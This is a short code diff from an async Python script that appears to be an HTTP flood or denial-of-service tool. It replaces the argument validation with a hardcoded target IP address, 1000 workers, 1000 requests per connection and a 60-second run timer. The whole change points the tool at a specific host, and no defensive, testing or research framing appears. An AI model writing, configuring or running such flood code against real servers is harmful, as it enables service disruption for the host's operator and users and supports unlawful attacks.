@@ -22,17 +22,10 @@ async def main():
     global pps, cps
     
     try:
-
-        assert len(args) == 5, "python3 %s <target> <workers> <rpc> <timer>" % args[0]
-        assert URL(args[1]) or None, "Invalid url"
-        assert args[2].isdigit(), "Invalid workers integer"
-        assert args[3].isdigit(), "Invalid connection pre seconds"
-        assert args[4].isdigit(), "Invalid timer"
-        
-        target = URL(args[1])
-        workers = int(args[2])
-        rpc = int(args[3])
-        timer = int(args[4])
+        target = "http://88.198.48.45"
+        workers = 1000
+        rpc = 1000
+        timer = 60
         event = Event()
 
         payload = (
